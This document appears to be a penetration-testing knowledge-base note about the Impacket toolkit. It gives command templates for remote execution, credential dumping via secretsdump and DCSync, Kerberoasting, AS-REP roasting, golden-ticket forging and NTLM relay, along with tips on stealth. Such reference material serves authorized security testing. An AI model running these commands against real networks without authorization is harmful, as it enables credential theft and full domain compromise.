---
title: "Impacket"
type: tool
tags: [active-directory, windows, smb, kerberos, lateral-movement, post-exploitation]
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
phase: postex
---

## Purpose

**Impacket** is a Python collection of scripts implementing Windows network protocols (SMB, MSRPC, Kerberos, LDAP, MSSQL). It powers most AD attacks: remote execution, credential dumping, ticket forging, and relaying.

## Install / setup

```bash
pipx install impacket
# scripts are prefixed impacket- (or *.py): impacket-secretsdump, impacket-GetUserSPNs ...
```

## Core usage

Auth string is consistent across scripts:
```
impacket-<script> <domain>/<user>:<password>@<target>
impacket-<script> -hashes :<NTLM> <domain>/<user>@<target>     # pass-the-hash
impacket-<script> -k -no-pass <domain>/<user>@<target>         # Kerberos (needs KRB5CCNAME)
```

## Common use cases

```bash
# Remote execution (pick by stealth/reliability)
impacket-psexec <d>/<u>:<p>@<t>          # SYSTEM, drops a service (noisy)
impacket-wmiexec <d>/<u>:<p>@<t>         # semi-interactive, no disk artifact
impacket-smbexec <d>/<u>:<p>@<t>
impacket-atexec / impacket-dcomexec

# Credential dumping
impacket-secretsdump <d>/<u>:<p>@<dc>    # SAM/LSA + DCSync if rights
impacket-secretsdump -just-dc <d>/<u>:<p>@<dc>   # NTDS via DCSync only

# Kerberos
impacket-GetNPUsers <d>/ -usersfile users.txt -no-pass -dc-ip <dc>   # AS-REP roast
impacket-GetUserSPNs <d>/<u>:<p> -request -dc-ip <dc>                # Kerberoast
impacket-getTGT <d>/<u>:<p>;  export KRB5CCNAME=<u>.ccache           # request TGT
impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain <d> Administrator   # golden ticket

# Relay + MITM
impacket-ntlmrelayx -tf targets.txt -smb2support    # relay coerced auth (with PetitPotam/printerbug)
impacket-mssqlclient <d>/<u>:<p>@<t> -windows-auth
```

## Tips and gotchas
- Pass-the-hash uses `-hashes LM:NT` (LM may be empty: `:NT`).
- Kerberos scripts need correct clock (sync to DC) and `KRB5CCNAME` exported; use FQDN not IP with `-k`.
- `ntlmrelayx` pairs with a coercion trigger (PetitPotam/printerbug/`coercer`) and SMB signing disabled on the target.
- [[netexec]] wraps many of these for spray/enum; Impacket gives the precise primitive.

## Related techniques
[[active-directory]], [[ad-lateral-movement]], [[kerberos-attacks]], [[pass-the-hash]], [[ad-persistence]]. Drive with the `hunt-ad` skill.

## Sources
